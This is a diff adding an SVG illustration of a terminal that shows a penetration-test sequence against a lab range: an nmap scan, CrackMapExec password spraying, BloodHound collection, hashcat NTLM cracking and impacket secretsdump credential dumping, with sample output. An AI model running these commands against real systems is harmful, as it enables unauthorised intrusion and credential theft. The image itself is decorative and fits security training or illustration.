@@ -1,0 +1,48 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1000 640" role="img" aria-label="Stylized terminal showing nmap, CrackMapExec, BloodHound, and Hashcat run against a lab range">
+  <defs>
+    <linearGradient id="rtBg" x1="0%" y1="0%" x2="0%" y2="100%">
+      <stop offset="0%" stop-color="#121513"/>
+      <stop offset="100%" stop-color="#0c0f0d"/>
+    </linearGradient>
+  </defs>
+
+  <rect x="1" y="1" width="998" height="638" rx="14" fill="url(#rtBg)" stroke="#2a302c" stroke-width="2"/>
+
+  <!-- title bar -->
+  <rect x="1" y="1" width="998" height="46" rx="14" fill="#171b19"/>
+  <rect x="1" y="33" width="998" height="14" fill="#171b19"/>
+  <line x1="1" y1="47" x2="999" y2="47" stroke="#2a302c" stroke-width="1"/>
+  <circle cx="30" cy="24" r="7" fill="#c62828"/>
+  <circle cx="54" cy="24" r="7" fill="#e6b422"/>
+  <circle cx="78" cy="24" r="7" fill="#4caf50"/>
+  <text x="500" y="29" text-anchor="middle" font-family="Consolas, 'Courier New', monospace" font-size="13" fill="#a4aca6">root@kali: ~/engagements/lab-range</text>
+
+  <!-- body -->
+  <g font-family="Consolas, 'Courier New', monospace" font-size="15" xml:space="preserve">
+    <text x="26" y="86"  fill="#4caf50">root@kali:~/engagements/lab-range$ <tspan fill="#e7ebe8">nmap -sC -sV -oA scan 10.10.11.0/24</tspan></text>
+    <text x="26" y="112" fill="#7d8a80">Nmap scan report for 10.10.11.12</text>
+    <text x="26" y="134" fill="#7d8a80">22/tcp open ssh   445/tcp open microsoft-ds   3389/tcp open ms-wbt-server</text>
+
+    <text x="26" y="176" fill="#4caf50">root@kali:~/engagements/lab-range$ <tspan fill="#e7ebe8">crackmapexec smb 10.10.11.0/24 -u users.txt -p 'Summer2024!' --shares</tspan></text>
+    <text x="26" y="202" fill="#8fe396">SMB   10.10.11.12  445  DC01   [+] CORP.LOCAL\svc_backup:Summer2024! (Pwn3d!)</text>
+
+    <text x="26" y="244" fill="#4caf50">root@kali:~/engagements/lab-range$ <tspan fill="#e7ebe8">bloodhound-python -u svc_backup -p 'Summer2024!' -d corp.local -c All</tspan></text>
+    <text x="26" y="270" fill="#7d8a80">[+] Collected 214 users, 38 groups, 6 sessions -&gt; ready for BloodHound</text>
+
+    <text x="26" y="312" fill="#4caf50">root@kali:~/engagements/lab-range$ <tspan fill="#e7ebe8">hashcat -m 1000 ntlm.hashes rockyou.txt -O</tspan></text>
+    <text x="26" y="338" fill="#8fe396">Session..: hashcat   Status...: Cracked   3/42 hashes recovered</text>
+
+    <text x="26" y="380" fill="#4caf50">root@kali:~/engagements/lab-range$ <tspan fill="#e7ebe8">impacket-secretsdump CORP.LOCAL/svc_backup:'Summer2024!'@10.10.11.12</tspan></text>
+    <text x="26" y="406" fill="#7d8a80">[*] Dumping cached domain logon information (uid:GUID)</text>
+
+    <text x="26" y="448" fill="#4caf50">root@kali:~/engagements/lab-range$ <tspan fill="#e7ebe8">█</tspan></text>
+  </g>
+
+  <!-- faint network grid watermark, bottom -->
+  <g stroke="#2a302c" stroke-width="1" opacity="0.5">
+    <path d="M0 560 H1000 M0 600 H1000"/>
+  </g>
+  <g font-family="Consolas, 'Courier New', monospace" font-size="12" fill="#2e7d32" opacity="0.6">
+    <text x="26" y="592">[lab-range] 42 hosts up · 12 hosts SMB signing disabled · scope: 10.10.11.0/24</text>
+  </g>
+</svg>
